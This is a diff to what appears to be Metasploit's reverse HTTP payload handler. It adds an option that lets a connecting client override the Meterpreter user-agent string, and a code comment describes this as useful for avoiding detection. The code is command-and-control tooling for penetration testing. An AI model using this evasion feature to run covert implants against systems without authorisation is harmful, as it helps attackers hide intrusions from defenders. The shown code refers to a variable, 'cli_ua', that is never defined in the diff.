@@ -54,7 +54,9 @@ module ReverseHttp
         OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
         OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
         OptBool.new('OverrideRequestHost', [ false, 'Forces clients to connect to LHOST:LPORT instead of keeping original payload host', false ]),
-        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
+        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>']),
+        OptBool.new('AllowClientUserAgentOverride', [ false, 'Allows a connecting client to set the meterpreter user agent string by sending an ECHOUA request', false])
+            
       ], Msf::Handler::ReverseHttp)
   end
 
@@ -234,8 +236,14 @@ protected
         blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
         blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
         blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
-        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
-
+        
+        # Override default behavior with client's user agent if set and allowed
+        if datastore['AllowClientUserAgentOverride']==true && cli_ua != ""
+            blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(cli_ua)}'")
+        else
+            blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
+        end
+       
         unless datastore['PayloadProxyHost'].blank?
           proxy_url = "http://#{datastore['PayloadProxyHost']||datastore['PROXYHOST']}:#{datastore['PayloadProxyPort']||datastore['PROXYPORT']}"
           blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
@@ -294,18 +302,26 @@ protected
         #
         # Patch options into the payload
         #
-        Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
-          :ssl            => ssl?,
-          :url            => url,
-          :expiration     => datastore['SessionExpirationTimeout'],
-          :comm_timeout   => datastore['SessionCommunicationTimeout'],
-          :ua             => datastore['MeterpreterUserAgent'],
-          :proxy_host     => datastore['PayloadProxyHost'],
-          :proxy_port     => datastore['PayloadProxyPort'],
-          :proxy_type     => datastore['PayloadProxyType'],
-          :proxy_user     => datastore['PayloadProxyUser'],
-          :proxy_pass     => datastore['PayloadProxyPass']
-
+        
+        # Path in client's user agent if allowed
+        if datastore['AllowClientUserAgentOverride']==true
+            active_ua = req.headers['User-Agent']
+        else
+            active_ua = datastore['MeterpreterUserAgent']
+        end
+                                               
+       Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
+       :ssl            => ssl?,
+       :url            => url,
+       :expiration     => datastore['SessionExpirationTimeout'],
+       :comm_timeout   => datastore['SessionCommunicationTimeout'],
+       :ua             => active_ua,
+       :proxy_host     => datastore['PayloadProxyHost'],
+       :proxy_port     => datastore['PayloadProxyPort'],
+       :proxy_type     => datastore['PayloadProxyType'],
+       :proxy_user     => datastore['PayloadProxyUser'],
+       :proxy_pass     => datastore['PayloadProxyPass']
+                                               
         resp.body = encode_stage(blob)
 
         # Short-circuit the payload's handle_connection processing for create_session
@@ -320,13 +336,12 @@ protected
       when /^\/ECHOUA/
         
         # Request to echo back the user agent, useful to avoid detection
-        print_status("Reflecting the user agent and updating the meterpreter user agent")
+        print_status("Request received to reflect the client's user agent string")
         
-        # Update the currently configured meterpreter UA to what came from the client
-	datastore['MeterpreterUserAgent'] = req.headers["User-Agent"]
         resp.body="<html><body>"+ req.headers["User-Agent"] + "</body></html>"
         resp.code    = 200
         resp.message = "OK"
+                                               
       when /^\/CONN_.*\//
         resp.body = ""
         # Grab the checksummed version of CONN from the payload's request.
